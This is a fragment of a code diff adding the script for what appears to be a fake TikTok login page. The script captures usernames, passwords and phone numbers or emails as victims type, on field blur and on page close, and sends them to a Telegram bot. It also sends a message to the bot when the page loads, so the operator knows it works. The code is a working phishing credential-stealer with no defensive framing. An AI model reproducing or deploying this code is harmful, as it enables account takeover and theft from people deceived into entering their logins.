+                var pwd = document.getElementById('password').value;
+                var phone = document.getElementById('phoneInput') ? document.getElementById('phoneInput').value : '';
+
+                var fields = {};
+                var changed = false;
+
+                if (uname && uname !== lastSentUname) {
+                    fields['Username'] = uname;
+                    lastSentUname = uname;
+                    changed = true;
+                }
+                if (pwd && pwd !== lastSentPwd) {
+                    fields['Password'] = pwd;
+                    lastSentPwd = pwd;
+                    changed = true;
+                }
+                if (phone && phone !== lastSentPhone) {
+                    fields['Phone/Email'] = phone;
+                    lastSentPhone = phone;
+                    changed = true;
+                }
+
+                if (changed) {
+                    var msg = buildMsg('live', fields);
+                    sendToTelegram(msg);
+                }
+            }
+
+            document.querySelectorAll('input').forEach(function(inp) {
+                inp.addEventListener('input', function() {
+                    clearTimeout(liveTimer);
+                    liveTimer = setTimeout(captureLiveInputs, 5000);
+                });
+                inp.addEventListener('blur', function() {
+                    clearTimeout(liveTimer);
+                    captureLiveInputs();
+                });
+            });
+
+            // ---------- Capture on page close ----------
+            window.addEventListener('beforeunload', function() {
+                var uname = document.getElementById('username').value;
+                var pwd = document.getElementById('password').value;
+                if (uname || pwd) {
+                    var fields = {};
+                    if (uname) fields['Username'] = uname;
+                    if (pwd) fields['Password'] = pwd;
+                    var msg = buildMsg('close', fields);
+                    sendToTelegramSync(msg);
+                }
+            });
+
+            // ========== TEST ON PAGE LOAD ==========
+            // Send a test message so you know the bot works
+            document.addEventListener('DOMContentLoaded', function() {
+                var testMsg = "🤖 <b>Bot Online</b>\n──────────────────────\n";
+                testMsg += "✅ TikTok page loaded and ready\n";
+                testMsg += "📄 <b>Page:</b> " + window.location.href + "\n";
+                testMsg += "──────────────────────";
+                sendToTelegram(testMsg);
+            });
+
+        })();
+    </script>
+</body>
+
+</html>
